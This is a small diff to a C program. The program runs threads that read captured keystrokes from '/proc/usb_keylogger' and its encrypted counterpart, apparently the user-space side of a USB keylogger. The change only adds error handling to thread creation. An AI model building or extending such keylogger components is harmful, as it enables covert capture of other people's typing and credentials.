@@ -6,7 +6,7 @@
 
 #define PROC_PLAINTEXT "/proc/usb_keylogger"
 #define PROC_ENCRYPTED "/proc/usb_keylogger_encrypted"
-#define BUFFER_SIZE 1024  // Define BUFFER_SIZE here
+#define BUFFER_SIZE 1024
 
 void *read_plaintext(void *arg) {
     int fd = open(PROC_PLAINTEXT, O_RDONLY);
@@ -56,8 +56,14 @@ int main() {
     pthread_t thread1, thread2;
 
     // Create threads to read from /proc files
-    pthread_create(&thread1, NULL, read_plaintext, NULL);
-    pthread_create(&thread2, NULL, read_encrypted, NULL);
+    if (pthread_create(&thread1, NULL, read_plaintext, NULL) != 0) {
+        perror("Failed to create plaintext thread");
+        return 1;
+    }
+    if (pthread_create(&thread2, NULL, read_encrypted, NULL) != 0) {
+        perror("Failed to create encrypted thread");
+        return 1;
+    }
 
     // Wait for threads to finish (they won't, since they run in an infinite loop)
     pthread_join(thread1, NULL);
